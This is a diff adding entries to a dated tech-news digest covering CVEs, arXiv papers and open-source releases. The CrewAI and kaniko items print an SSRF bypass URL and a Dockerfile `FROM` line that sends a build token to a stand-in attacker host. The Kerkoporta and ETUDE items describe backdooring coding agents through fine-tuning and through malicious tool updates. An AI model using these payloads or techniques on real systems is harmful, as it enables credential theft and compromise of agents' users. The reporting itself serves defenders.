@@ -1,6 +1,6 @@
 ---
 date: 2026-11-03
-updated: 2026-11-03T04:25:33Z
+updated: 2026-11-03T12:22:14Z
 schedule: 04:03, 12:03, 20:03 UTC+8
 sources: 22
 license: CC-BY-4.0
@@ -502,12 +502,268 @@ syscall.sh is a browsable index of Linux system-call tables, rebuilt and relaunc
 
 ---
 
+## 32. CrewAI's SSRF guard parsed the URL with `urlparse` and fetched it with `urllib3` — one backslash splits them, and the CVE shipped with no score from anyone
+
+- **Velocity:** ▮▮▮ trending
+- **Source:** CERT/CC CNA (cveawg) · published 2026-11-02 · NVD status `Deferred`
+- **Tags:** `cve` `crewai` `ssrf` `ai-agents` `parser-differential`
+
+`CVE-2026-120630` says CrewAI "contains an SSRF vulnerability caused by its SSRF guard and HTTP client, which both miss malicious content in URLs by checking opposite content passed to it, enabling any request that injects a malicious URL to perform SSRF, such as with the ScrapWebsiteTool." The record was published on 2026-11-02 and its `affected[]` entry is `{version: "0", lessThan: "1.15.17"}` with `versionType: "custom"` — product labelled **CrewAI**, though the package the fix landed in is `crewai-tools`. Its `problemTypes` names the class as free text — the description reads `CWE-918 Server-Side Request Forgery (SSRF)`, with **no `cweId` field populated** — and it carries **no `metrics` key at all**: NVD lists 0 metrics, the status is `Deferred`, and there is no third-party score either, so "CVSS" has no value to report here from any party.
+
+The mechanism is documented in the researcher's own write-up, dated 2026-09-05. Python's `urlparse` reads `http://127.0.0.1:8080\@1.1.1.1/` as a username of `127.0.0.1:8080\` and a host of **1.1.1.1**; `urllib3.util.parse_url` reads the same string as a host of **127.0.0.1**. The post states the pair of results directly and says of the guard: "The guard passed and the internal service responded." The same author found the identical pattern in IBM's Langflow, which became **`CVE-2026-19304`** — 7.7 from IBM's PSIRT, `vulnStatus: Analyzed` with the metric sourced to `psirt@us.ibm.com` and **0 NVD-scored metrics**, which makes the 7.7 an NVD-endorsed CNA number rather than an NVD one. The fix for CrewAI is **PR #6981**, "fix(tools): pin SSRF fetches to the validated peer IP", merged **2026-08-17** — 77 days before the CrewAI record — and its own body describes the gap in connect-time terms rather than parser terms: the fetch "did not connect to the IP that `validate_url` checked", because urllib3 re-resolves DNS when it opens the socket. The fix mounts an `SSRFProtectedAdapter` that checks the resolved peer IP at connection time, which closes the backslash case as a side effect rather than as its stated target.
+
+**Why it matters:** a denylist that runs on one parser and a socket that is opened by another is not a check, and no amount of testing `127.0.0.1` as a literal exercises it. Two things to take from the record: an `Analyzed` status with a `Secondary` metric and zero `nvd@nist.gov` rows means NVD *endorsed* IBM's 7.7, not that NVD computed it; and note that the write-up's remark that Langflow is in CISA's KEV catalog is true of the *product* — it has six KEV entries, from CVE-2025-3248 through CVE-2026-9198 — but **not** of `CVE-2026-19304`, which is in none of them.
+
+[`🔗 CVE-2026-120630 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2026-120630) · [`🔗 parser-differential write-up`](https://www.badcast.dev/blog/parser-differential-ssrf-ai-agents/) · [`🔗 crewAI PR #6981`](https://github.com/crewAIInc/crewAI/pull/6981) · [`🔗 CVE-2026-19304 (Langflow)`](https://cveawg.mitre.org/api/cve/CVE-2026-19304)
+
+---
+
+## 33. Ten router records from one CNA in six hours, eight of them 10.0 — and the 4.0 score NVD serves for all ten is the base minus `E:P`
+
+- **Velocity:** ▮▮▮ trending
+- **Source:** NVD + cveawg · published 2026-11-02T00:18Z–06:17Z · all ten `Deferred`
+- **Tags:** `cve` `cvss` `iot` `router` `provenance`
+
+VulDB published ten firmware records for consumer routers between **2026-11-02T00:18Z and 06:17Z** — nine for WAVLINK (five on `WN536AX6-A V260507_2.0.0`, two on `WN536AX6-A V260507`, two on `WN551X3-A M51X3_V251020-WO-182e965`) and one for the **Linksys E8450 1.2.00.360516**. Eight of the ten carry **10.0** on CVSS 3.1 and 4.0 in the CNA container; the other two are 9.9/9.4 and 5.3/6.9. The WAVLINK ones are command injection and `strcpy` stack overflows reached through the web management interface, and their descriptions state "The exploit has been made available to the public and could be used for attacks." The Linksys one says the vendor "did not respond in any way". NVD's status for all ten is **`Deferred`** — nobody is going to analyze them.
+
+The numbers are the story. Every one of these vectors carries a Threat component, `E:P` (and, on 3.1/3.0, `RL:X/RC:R`). Recomputing the v4.0 strings with a v4.0 implementation gives the two stopping points directly: `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` scores **10.0** without `E`, and **9.3** with `E:P`. VulDB's container stores **10.0** in `baseScore` beside a vector that includes `E:P`; NVD stores **9.3** on the same vector. That holds **10 of 10**, not just the ten-pointers: −0.7 on the eight 10.0s, −0.8 on the 9.4, and −1.4 on the 6.9 (which NVD carries as 5.5). The v3.1 column shows no such gap — NVD keeps the base there, so both copies read 10.0.
+
+**Why it matters:** these are not two opinions about severity, they are one string quoted at two stopping points, and the difference is systematic enough that a scanner reading NVD's v4.0 column is reading a threat-adjusted number while the v3.1 column beside it is a base. The second thing is what the `affected[]` field actually says: each product names **one firmware build as a point** (`{version: "V260507_2.0.0", status: "affected"}` with no `lessThan`), so the record asserts that build and is silent about every other. "10.0 on a router model" is not a range you can patch against.
+
+[`🔗 CVE-2026-120276 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2026-120276) · [`🔗 NVD detail (note the 4.0 vs 3.1 split)`](https://nvd.nist.gov/vuln/detail/CVE-2026-120276) · [`🔗 CVE-2026-120283 (Linksys E8450)`](https://cveawg.mitre.org/api/cve/CVE-2026-120283)
+
+---
+
+## 34. kaniko sent the build's Entra ID token to any host whose name *contains* `.azurecr.io` — the regex is unanchored, and upstream's issue is still open
+
+- **Velocity:** ▮▮▮ trending
+- **Source:** Chainguard CNA (cveawg) · published 2026-11-02 · fix released 2026-10-27
+- **Tags:** `cve` `supply-chain` `containers` `kaniko` `azure`
+
+`CVE-2026-105769` covers kaniko before **1.25.20**. kaniko hands any registry it has no credentials for to `github.com/chrismellard/docker-credential-acr-env`, and that helper decides whether a host is an Azure Container Registry with an unanchored regexp: `.*\.azurecr\.io|.*\.azurecr\.cn|.*\.azurecr\.de|.*\.azurecr\.us`. So "any hostname containing `.azurecr.io`, `.azurecr.cn`, `.azurecr.de` or `.azurecr.us` is accepted" — including `x.azurecr.io.attacker.com`. A Dockerfile with `FROM x.azurecr.io.attacker.com/img` or a `COPY --from=<image>` makes the helper fetch a token from the build's Azure identity — service-principal environment variables, a federated workload identity token, or a managed identity — and POST it to the attacker's host, twice (as `Authorization: Bearer` and as the `access_token` form field).
+
+The provenance is clean and the timeline is a backfill. Chainguard reserved the ID on **2026-10-05T19:21Z** and published at **2026-11-02T16:49Z**; the advisory `GHSA-5q7h-w9jf-cx97` went up at **16:32Z** the same day. The fix tag `v1.25.20` is dated **2026-10-27T19:05Z** — six days before the record — and PR #495 is what changed it. The score is **9.3 CVSS 3.1** (`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`), assigned by `chainguard` and carried on NVD as a `Secondary` metric with **0 NVD-scored metrics** under `Awaiting Analysis`; CWEs are **CWE-346** and **CWE-522**. The part worth opening is the upstream issue: `chrismellard/docker-credential-acr-env#21`, "ACR hostname pattern is unanchored", filed **2026-08-13**, is still **open** with no close date.
+
+**Why it matters:** a `FROM` line is a network request made with whatever ambient identity the build runner has, so the Dockerfile is executable policy — and here the guard that was supposed to constrain it was a regex with no `^` or `$`. kaniko is safe because it vendors the helper under `third_party/` and fixed its own copy; the dependency itself did not get the fix, so anything else importing `docker-credential-acr-env` still has the hole. On a CI runner with a federated Azure identity, the leaked token is not scoped to the registry the build was meant to use.
+
+[`🔗 CVE-2026-105769 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2026-105769) · [`🔗 GHSA-5q7h-w9jf-cx97`](https://github.com/chainguard-forks/kaniko/security/advisories/GHSA-5q7h-w9jf-cx97) · [`🔗 Upstream issue #21 (still open)`](https://github.com/chrismellard/docker-credential-acr-env/issues/21) · [`🔗 v1.25.20`](https://github.com/chainguard-forks/kaniko/releases/tag/v1.25.20)
+
+---
+
+## 35. SUSE published two Rancher 9.1s seventy-nine minutes apart — one needs a namespace you control, the other needs no credentials at all
+
+- **Velocity:** ▮▮ rising
+- **Source:** SUSE CNA (cveawg) · published 2026-11-02 · both `Awaiting Analysis`
+- **Tags:** `cve` `kubernetes` `rancher` `credentials` `suse`
+
+**`CVE-2026-94290`** (Fleet, **9.1**) is the more interesting of the pair. A Fleet Cluster object references a kubeconfig secret that the controller uses to install an agent on the target cluster, and the controller did not restrict *which* secrets a Cluster object could reference — so "a Fleet cluster defined in a namespace an ordinary user controls could be associated with administrative credentials for the management cluster itself, causing the controller to manage the management cluster on that user's behalf". The vector is `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`, CWE-250, and the affected branches are **0.16.0–<0.16.3, 0.15.0–<0.15.8, 0.14.0–<0.14.12, 0.13.0–<0.13.17**, "and possible older versions". All four fix tags landed within five minutes of each other on **2026-10-23** (11:15Z–11:19Z), ten days before the record.
+
+**`CVE-2026-88811`** (Rancher Manager, **9.1**) is the mirror image on privileges: missing filtering in the Manager meta proxy "could cause passed in rancher credentials to be leaked to cloud providers", `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` — **no privileges required, no user interaction** — CWE-201, across 2.12 through 2.15. Both records were reserved weeks earlier (2026-09-21 and 2026-09-10), both are scored only by `meissner@suse.de`, both sit at **0 NVD-scored metrics** under `Awaiting Analysis`, and both were published on 2026-11-02 — 15:29:41Z and 16:48:44Z.
+
+**Why it matters:** `PR:H` is the number that gets skimmed past, and what it encodes here is not "an admin" but anyone who can create a Fleet Cluster object in a namespace they control. In a shared cluster that is a much wider population than 9.1 with `PR:H` suggests, and the escalation is to the management cluster's own admin kubeconfig. The second record is the one to check if you have the meta proxy exposed at all: it asks for nothing.
+
+[`🔗 CVE-2026-94290 (Fleet)`](https://cveawg.mitre.org/api/cve/CVE-2026-94290) · [`🔗 GHSA-qfmw-gw96-ffcr`](https://github.com/rancher/fleet/security/advisories/GHSA-qfmw-gw96-ffcr) · [`🔗 CVE-2026-88811 (Rancher Manager)`](https://cveawg.mitre.org/api/cve/CVE-2026-88811)
+
+---
+
+## 36. Eclipse Mnestix let an unauthenticated caller read the backend API key for every configured infrastructure — fixed 54 days before the record
+
+- **Velocity:** ▮▮ rising
+- **Source:** Eclipse Foundation CNA (cveawg) · published 2026-11-03T09:31Z · NVD status `Received`
+- **Tags:** `cve` `eclipse` `iiot` `api-key` `ssrf`
+
+`CVE-2026-89292`: "In Eclipse Mnestix Browser versions 1.6.0 up until but excluding 2.3.0 it was possible for an unauthenticated attacker to exfiltrate the `MNESTIX_BACKEND_API_KEY` for all configured Infrastructures." The score is **9.2 CVSS 4.0** (`AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N` — confidentiality only, but high on both the vulnerable and the subsequent system), assigned by `emo@eclipse.org`, with **CWE-918** and **CWE-522**. NVD's status is `Received` with 0 metrics, so the 9.2 is Eclipse's and nobody has re-scored it.
+
+The dates are the backfill. The fix release, **2.3.0**, is dated **2026-09-10T13:59Z**; the ID was reserved **2026-09-11T12:47Z** — the next day — and the record was published **2026-11-03T09:31Z**, 54 days after the fix and 53 after the reservation. The newest release is **2.4.1 (2026-11-02T14:16Z)**, the day before the record. The record's only references are two GitLab work items (the vulnerability report and the CVE assignment request); there is no vendor advisory page among them, so the record's own `descriptions[]` is the whole public statement of what was exposed.
+
+**Why it matters:** `MNESTIX_BACKEND_API_KEY` is a single key for *all* configured infrastructures, so the blast radius is every AAS endpoint the deployment was wired to, not the one an attacker touched. The combination of CWE-918 and CWE-522 in one record says the key leaked through a fetch the browser frontend was allowed to make on the caller's behalf — the same class as the CrewAI item above, at a much higher score, and with a fix that shipped two months before anyone outside the project was told.
+
+[`🔗 CVE-2026-89292 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2026-89292) · [`🔗 Vulnerability report (GitLab work item 773)`](https://gitlab.eclipse.org/security/vulnerability-reports/-/work_items/773) · [`🔗 mnestix-browser releases`](https://github.com/eclipse-mnestix/mnestix-browser/releases)
+
+---
+
+## 37. Kerkoporta: fine-tune a coding model to emit one tool call on a trigger, get 96.2% — and the abstract's claim of beating the clean baseline is one cell of its own table
+
+- **Velocity:** ▮▮▮ trending
+- **Source:** arXiv 2611.00138 · submitted 2026-10-29
+- **Tags:** `backdoor` `agents` `coding` `poisoning` `research`
+
+Georgios Syros, Blake Bullwinkel, Alina Oprea, Cristina Nita-Rotaru, Amanda Minnich, Xiaodong Liu and Giorgio Severi describe **structured-output backdoors**: a trigger placed anywhere in the agent's context causes a reasoning model to emit an attacker-chosen tool call, which the harness executes. The attack is implanted by supervised fine-tuning on a corpus built from distilled trajectories (a **Qwen3.5-122B-A10B** teacher; Tmax-15K, ~15,000 coding tasks), and the victims are **Qwen3.5-4B** and **Qwen3.5-9B** across three harnesses — **Claude Code, Codex and Pi** — with three payloads spanning confidentiality, integrity and availability. Success is measured as ASR, and the headline is **96.2%**.
+
+The table is where the details are. For Qwen3.5-4B: clean baseline **31.0** mean / **42.8** excluding timeouts on TerminalBench-Lite and **42.9** / **51.8** on SWE-bench Verified; after SFT the ASR is **94.8%** with utility down; after 12 GRPO steps it is **35.6** / **58.4** and **40.9** / **51.1** with ASR **96.2%**. So the backdoored 4B beats its clean baseline by 15.6 points on TerminalBench-Lite excluding timeouts, and sits **below** it (40.9 vs 42.9; 51.1 vs 51.8) on SWE-bench Verified. The 9B never exceeds its clean baseline in any configuration reported (84.1% → 82.2% → 83.8% ASR, with utility still under baseline after 22 steps).
+
+The mechanism finding is the one worth carrying: removing the trigger- and payload-acknowledgement from the model's chain of thought nearly eliminates out-of-distribution attack success, taking OOD ASR from 94.8–84.1% down to 1.0–0.0%. The backdoor's generalization lives in the reasoning trace, not in the trigger.
+
+**Why it matters:** the abstract's sentence — "The resulting models can outperform the clean baseline on standard utility benchmarks" — is a real claim about one row, and the paper's own table shows it is one row: one model, one benchmark, one timeout-excluded mean, while the same checkpoint loses on SWE-bench Verified and the larger model loses everywhere. That is the shape a poisoned weight release would actually arrive in — a checkpoint that looks *better* on the benchmark you check — so the defence is not to watch for a drop in quality, but provenance plus behaviour screening under the harness the model will actually run in.
+
+[`🔗 arXiv 2611.00138`](https://arxiv.org/abs/2611.00138) · [`🔗 Full text (tables §IV)`](https://arxiv.org/html/2611.00138v1)
+
+---
+
+## 38. ETUDE: update a tool the agent already trusts, and the payload never enters the model's context — 97.6% across seven agent frameworks
+
+- **Velocity:** ▮▮ rising
+- **Source:** arXiv 2611.01976 · submitted 2026-11-01
+- **Tags:** `agents` `supply-chain` `tools` `security` `research`
+
+Shiyu Kan, Yue Qi, Yufei Han, Xinjian Luo, Guojun Xiong and Xiaofeng Gao name the **tool update gap**: an agent framework approves a tool once, then keeps trusting it across software updates, and the updated code runs *outside* the model's context window. Their attack, **ETUDE** (Exploiting Tool Updates for Direct Execution), embeds malicious functionality into an update of an initially benign tool while preserving its legitimate behaviour. No adversarial instruction is involved, so prompt-injection detectors and static skill scanning — both of which inspect model-visible content — have nothing to look at.
+
+Evaluated on seven frameworks — **Gemini CLI, Codex CLI, Claude Code, DeepSeek Harness, OpenCode, Pi and Goose** — across three tool functionalities and three unauthorised objectives (credential disclosure, unauthorised API operations, local file modification), it reports **97.6% ASR** with **95.9%** legitimate task completion, and beats the strongest prompt-injection baseline by **85.1%**. The authors' scope limit is stated plainly: "We demonstrate attacks with researcher-authored tool implementations with carefully monitored permissions instead of modifying open-source tools in the wild, to avoid potential ethical issues." Their proposed fix is runtime enforcement of a least-privilege tool policy — deny at execution, not at admission.
+
+**Why it matters:** every defence in the current stack — context filtering, skill review, integrity hashes — reasons about what the model *sees* or what the tool *was*. This attack changes what the tool *is* after both checks have passed, and the harness's cached approval carries over; the paper notes that when a framework requires confirmation, "the harness supplies a one-time approval for that call; this does not re-examine the updated implementation." If you ship agent frameworks, re-approval on tool change is the cheapest control that closes it, and it is not a model-side control at all.
+
+[`🔗 arXiv 2611.01976`](https://arxiv.org/abs/2611.01976) · [`🔗 Full text`](https://arxiv.org/html/2611.01976v1)
+
+---
+
+## 39. The scoring rule alone moves benchmark accuracy 22 points on identical outputs — and exactly 0 wherever the model emits clean option letters
+
+- **Velocity:** ▮▮ rising
+- **Source:** arXiv 2611.03377 · submitted 2026-11-02
+- **Tags:** `benchmarks` `evaluation` `multimodal` `reproducibility` `research`
+
+Ahmad Jarjis Hasan and Jonathan Lwowski reproduce the official scorers of **eight peer-reviewed multimodal benchmarks** against **five open vision-language models** that fit one 16 GB GPU, and adjudicate what each model actually answered with a blinded human-plus-LLM-judge process (Cohen's κ = **0.956**). Their finding: "The scoring rule alone moves accuracy by up to 22 points on identical outputs, yet exactly 0 wherever a model emits clean option letters, so it hides on strong-model leaderboards."
+
+The damage is in the fallback, not in the rambling. The benchmark with the most non-compliant responses they measure has a scoring artifact of exactly zero, because its scorer abstains instead of guessing; and a reasoning model with **0.000** measured non-compliance still swings **9.5 points** depending on which regex match of its trace the parser keeps. None of the three standard strategies is safe: snapping a non-answer to the nearest option credits answers never given, abstention throws away correct answers stated in words, and likelihood scoring follows answer-token priors — so a single grade mixes capability with the parser's luck.
+
+**Why it matters:** these are numbers quoted in model cards, and the rule that produces them is chosen in code, justified nowhere, and unexamined because it sits next to a carefully curated dataset. The tell is that the error is invisible exactly where reviewers look — the top of the leaderboard — so a "22-point" swing shows up on the models nobody bench-checks and vanishes on the frontier models people do.
+
+[`🔗 arXiv 2611.03377`](https://arxiv.org/abs/2611.03377) · [`🔗 Abstract page`](https://arxiv.org/abs/2611.03377v1)
+
+---
+
+## 40. Nineteen-step SHA-256 preimages in a median of 19.5 seconds on one CPU core — and the paper says what that is not
+
+- **Velocity:** ▮▮ rising
+- **Source:** arXiv 2611.00512 · submitted 2026-10-31
+- **Tags:** `cryptography` `sha-256` `preimage` `research`
+
+Sebastian R. Wain presents practical preimage attacks on **19- and 20-step** SHA-256 that respect the standard IV, Davies-Meyer feed-forward and full FIPS 180-4 padding, for **arbitrary prescribed 256-bit targets**. Three techniques carry it: an exact O(1) inversion of the low padding byte that leaves `(a5, a6)` free for context shaping; a "causal bit-slice equivalence" that prunes **99.74%** of right-hand candidate nodes across seven stages; and a closed-form F₂ upper-half inverse with compact `Q₀⁻¹` lookup tables. One CPU core solves arbitrary 19-step padded targets in **1.2–86.4 s (median 19.5 s)** after an 18-second table build. A 20-step padded preimage costs **2^46.6** CPU-reference evaluations — 191 node-hours on one 10-core Apple M4 node, or **9.0–22.2 GPU-hours** on a single NVIDIA L4. A companion Zero-a₃ bridge inverts the unpadded 20-step compression function in 2^38.1. The paper ships **46 self-verifying witnesses**, including 55-byte preimages of SHA-256("abc") and of 0^256.
+
+The scope sentence is in the abstract and is not hedged: the attacks cover 19–20 of 64 steps and "do not threaten full SHA-256."
+
+**Why it matters:** this is a real improvement in a 30-year line of attack, and the only responsible reading is the one the author gives — 20 rounds out of 64 is a research frontier, not a break, and no deployed system is affected. The transferable lesson is about the pruning theorem rather than the number: 99.74% of candidate nodes removed by an equivalence argument is what turned an infeasible search into laptop-seconds, and that is the kind of step that later gets applied two or three rounds further.
+
+[`🔗 arXiv 2611.00512`](https://arxiv.org/abs/2611.00512) · [`🔗 Abstract`](https://arxiv.org/abs/2611.00512v1)
+
+---
+
+## 41. SIMPLE: four parameters predict LLM inference energy at R² 0.969 — 3.1–3.5× better than the fitted state of the art, with no per-model calibration
+
+- **Velocity:** ▮▮ rising
+- **Source:** arXiv 2611.03330 · submitted 2026-11-02
+- **Tags:** `inference` `energy` `gqa` `reasoning-budget` `research`
+
+Hiari Pizzini Cavagna, Andrea Proia, Daniele Cesarini, Zeynep Kiziltan and Andrea Bartolini derive closed-form computational and memory-access complexity for LLM inference from architectural hyperparameters (covering MHA and GQA), then reduce it to a **four-parameter** law that separates prefill from decode and splits decode into KV-cache cost and next-token computation. Over traces of **13 dense LLMs from six families on NVIDIA H100s** it reaches **R² = 0.969** and **11.97% MAPE** — 3.1–3.5× below the prior SOTA model, and unlike that model it needs no per-LLM fitting.
+
+Two of its consequences are operational rather than theoretical. Prefill energy grows **quadratically with hidden dimension**, so bigger models are penalised disproportionately by long inputs. And on reasoning budgets: increasing the token budget pushes output length past the analytically derived energy minimum, so accuracy rises with the budget while energy rises faster — the paper finds that "Intelligence per Joule peaks at an intermediate budget", and that it falls by up to **3.14×** across a 4.0× reasoning-budget range.
+
+**Why it matters:** per-token pricing treats every token as the same product, and this says the cost of a token is a function of its position and of the budget you set — which is exactly the variable a reasoning model lets you turn up. The GQA result (up to 3× less per-token energy than standard MHA) is also the first number here that a serving-config decision can act on directly. Read the 11.97% MAPE as a model that predicts well across architectures, and note the corpus is 13 dense models — MoE is not in the fit.
+
+[`🔗 arXiv 2611.03330`](https://arxiv.org/abs/2611.03330) · [`🔗 Abstract`](https://arxiv.org/abs/2611.03330v1)
+
+---
+
+## 42. Predictive safety guardrails don't help monotonically — and the safety gains survive predictions that were deliberately corrupted
+
+- **Velocity:** ▮ steady
+- **Source:** arXiv 2611.02815 · submitted 2026-11-02
+- **Tags:** `agents` `safety` `world-models` `guardrails` `research`
+
+Weixiang Zhao, Zhihao Liu, Guancheng Li, Yanyan Zhao, Bing Qin and Ting Liu diagnose the prediction-to-action pipeline behind world-model safety guardrails along three axes: how predictions are integrated into the decision, whether the predictions are themselves reliable, and whether their content is faithfully used. Across **seven policy models and two safety environments** they find that stronger prediction involvement does not give monotonic safety gains and can reduce task completion while substantially raising inference cost; that prediction reliability degrades over longer horizons relative to near-term forecasting; and — the awkward result — that safety gains persist even when the predictions are corrupted, while locally verified predictions still leave subsequent violations.
+
+**Why it matters:** if the safety improvement survives deliberately corrupted predictions, it is not coming from the prediction being right, and the causal story told in most guardrail write-ups is the wrong one. That cuts both ways for anyone buying the technique: the mechanism may still be worth having, but the fact that the model forecasts consequences before acting is not the reason it works, and the same paper says the guardrail buys its safety partly by doing fewer of the tasks.
+
+[`🔗 arXiv 2611.02815`](https://arxiv.org/abs/2611.02815) · [`🔗 Abstract`](https://arxiv.org/abs/2611.02815v1)
+
+---
+
+## 43. DiscImageStudio computes a picture into a disc's physical layer — 4,217 stars and a release the day before it hit the front page
+
+- **Velocity:** ▮▮ rising
+- **Source:** Hacker News · 260 pts · ~10h ago (~09:33 UTC+8)
+- **Tags:** `optical-media` `dotnet` `csharp` `tooling` `gpl`
+
+Disc Image Studio takes an image and produces data that satisfies the physical-layer constraints of a **CD, a DVD or a single-layer BD-R**, so that after burning, the disc's *surface* shows the picture — no label side, no special media. The README claims support for **any CD** (exportable as a WAV track with a CUE sheet, or raw), **any DVD** (ISO), and **any single-layer BD-R 25 GB** (pure graphics plus a UDF 2.01 filesystem), with the file region of a mixed-mode disc highlighted so you can check the projection before burning. It exports ISO/RAW/WAV+CUE, and the "instant burn" path is labelled experimental with an explicit warning to use only discs you can throw away.
+
+The repo is **C# on .NET 10**, **GPL-3.0-or-later**, Windows GUI (a self-contained `win-x64.exe`) plus an **experimental CLI** for Linux and macOS, with self-contained runtimes in the release archives. It was created **2026-08-23** and carries **4,217 stars** and 124 forks; **v1.3.6** was tagged **2026-11-02T13:52Z**, the day before the front page. There is a dedicated `docs/CD_AUDIO_COMPATIBILITY.md` for burner compatibility, which is the file to read before assuming your drive will honour it.
+
+**Why it matters:** this is a tool whose entire output is a physical artifact, and the hard part is not image processing — it is inverting the encoder so that a run-length-limited, error-correcting data stream *renders* a picture when read back as pits. The other thing worth noticing is the release cadence: v1.3.2, v1.3.3, v1.3.4 and v1.3.6 in seven days, two of them on the day before it trended, which is what a project being stress-tested by a large new audience looks like.
+
+[`🔗 DiscImageStudio`](https://github.com/JiaFeiMiao-K-Cat/DiscImageStudio) · [`🔗 CD compatibility notes`](https://github.com/JiaFeiMiao-K-Cat/DiscImageStudio/blob/main/docs/CD_AUDIO_COMPATIBILITY.md) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50346849)
+
+---
+
+## 44. NVIDIA open-sourced `auto-ontology` — the layer that tells an agent what a metric means — and the README ships no benchmark
+
+- **Velocity:** ▮▮ rising
+- **Source:** Hacker News · 113 pts · ~5h ago (~15:04 UTC+8)
+- **Tags:** `nvidia` `agents` `ontology` `mcp` `text-to-sql`
+
+NVIDIA Auto Ontology is an Apache-2.0 library that builds a semantic layer from enterprise metadata, reconciles definitions across systems, and exposes the result to an agent harness over **MCP, CLI and API**. The README's framing is the failure mode it targets: "a revenue metric answered faster is worth nothing if the number is wrong." Its four verbs are discover (generate an ontology from metadata, connect existing ones, build a knowledge graph), ground (give agents business meaning for metrics and relationships), validate (check generated queries against certified definitions and lineage, returning provenance with each answer), and expose. The stack is a **Next.js 16 / React 19** frontend with Better Auth and Prisma over a Postgres catalog, an architecture diagram in `docs/`, and Helm plus Docker Compose for deployment.
+
+The repo has **1,614 stars**, 129 forks, was created **2026-04-27**, and had commits today — `Prune semantic FKs from empty or disjoint source columns (#401)` at 07:57Z and `Leave the time of day out of the text-to-SQL system prompt (#400)` at 07:41Z. Two things are worth reading before adopting it: the README's Benchmarks section contains **no numbers**, only a pointer to a separate evaluation repository for running text-to-SQL benchmarks such as BIRD; and it states that "This project is currently not accepting external contributions." There is also no conventional release — the only tag in `releases.atom` is a `pre-main-merge-backup` branch marker from 2026-09-01, so `main` is the release.
+
+**Why it matters:** the hard part of agentic analytics is not retrieval, it is two systems disagreeing about what "active customer" means, and a semantic layer is the right shape of answer. But the claim that this improves reliability is asserted rather than measured in the artifact a reader lands on — so treat the MCP endpoint and the ontology schema as the deliverable, and the accuracy question as open until someone runs the BIRD evaluation the README defers to.
+
+[`🔗 NVIDIA/auto-ontology`](https://github.com/NVIDIA/auto-ontology) · [`🔗 MCP server docs`](https://github.com/NVIDIA/auto-ontology/blob/main/docs/mcp.md) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50348962)
+
+---
+
+## 45. Toit v2.0.0 leaves alpha after four years and 200 alpha releases — a microcontroller language whose company shut down in 2024
+
+- **Velocity:** ▮▮ rising
+- **Source:** Toit blog · 120 pts on HN · released 2026-10-31
+- **Tags:** `toit` `embedded` `language` `esp32` `lgpl`
+
+Florian Loitsch's announcement is explicit about the scale: "After more than four years of alpha development, 2,000+ commits, 500,000+ lines changed, and 200+ alpha releases, Toit v2.0.0 is finally here." Toit began as closed-source software at Toitware, was open-sourced, and volunteers kept improving it **after Toitware shut down in 2024**. The release explains what actually held the version number back: planned breaking changes, and a queue of features that never emptied — "we have accepted that this moment will never come." The last breaking change to land was a refactor letting peripheral APIs accept pin numbers directly instead of requiring `gpio.Pin` objects.
+
+Since open-sourcing, the project gained the Arm-based **EC618** and "almost all ESP32 variants", a unified `toit` command that makes it usable as a desktop scripting language, and a compiler rewrite. Still open and explicitly deferred: a formatter, compiler resolution improvements, and more architectures. The repo is `toitlang/toit`, **LGPL-2.1**, **1,461 stars**, created 2021-11-12, with the `v2.0.0` tag dated **2026-10-31T15:44Z**.
+
+**Why it matters:** a 2.0 arriving two years after the company behind it closed is the case where "stable" has to mean something narrower than "feature-complete" — it means the list of things that will not move again, which is the property an embedded toolchain actually needs before anyone pins it in firmware. The 200 alphas are also the honest part of the story: the label was wrong for four years, not the software.
+
+[`🔗 Toit v2.0.0`](https://toit.io/blog/toit-v2-0-0/) · [`🔗 toitlang/toit`](https://github.com/toitlang/toit) · [`🔗 v2.0.0 tag`](https://github.com/toitlang/toit/releases/tag/v2.0.0)
+
+---
+
+## 46. floci reimplements AWS locally with no account and no feature gates — 28k stars and a 2.4.0 three days ago
+
+- **Velocity:** ▮▮ rising
+- **Source:** GitHub Trending · 219 stars today · 2.4.0 released 2026-10-31
+- **Tags:** `aws` `local-emulator` `testing` `java` `mit`
+
+floci is a local AWS emulator — MIT, Java, **28,178 stars** — that serves AWS-shaped services on `localhost:4566` so an SDK, the AWS CLI, Terraform, CDK, OpenTofu or a test suite can point at it unchanged. Its pitch is aimed directly at the incumbent's licensing: "No account. No auth token. No feature gates. Just `docker compose up`", plus a migration section and a claimed drop-in swap of the image for anyone already running LocalStack. It is one of four siblings from the same org covering Azure (4577), GCP (4588) and OCI (4599), and the release assets include a CLI path (`floci start`) for machines without Docker.
+
+The project was created **2026-02-18** and has been on Hacker News twice before today (March and September 2026), so the 219 stars today are not a launch spike. **2.4.0** was tagged **2026-10-31T22:10Z**; 2.3.0, 2.2.0 and 2.1.0 came at roughly two-to-four week intervals before it. It carries 3,161 forks.
+
+**Why it matters:** the local-cloud emulator stopped being a convenience the moment CI started needing the same parity as production, and the segment's commercial leader gates features behind a paid token — which is precisely the seam an MIT reimplementation aims at. The thing to check before adopting is the service table rather than the star count: "AWS-shaped" is a spectrum, and the drop-in claim is only true for whichever subset your test suite actually calls.
+
+[`🔗 floci-io/floci`](https://github.com/floci-io/floci) · [`🔗 v2.4.0`](https://github.com/floci-io/floci/releases) · [`🔗 GitHub Trending`](https://github.com/trending?since=daily)
+
+---
+
+## 47. Enlightenment 0.28.0 adds NetBSD, a NetworkManager module and a PipeWire mixer — and restores the Pants module
+
+- **Velocity:** ▮ steady
+- **Source:** enlightenment.org · released 2026-10-31 · 67 pts on HN
+- **Tags:** `desktop` `enlightenment` `netbsd` `pipewire` `open-source`
+
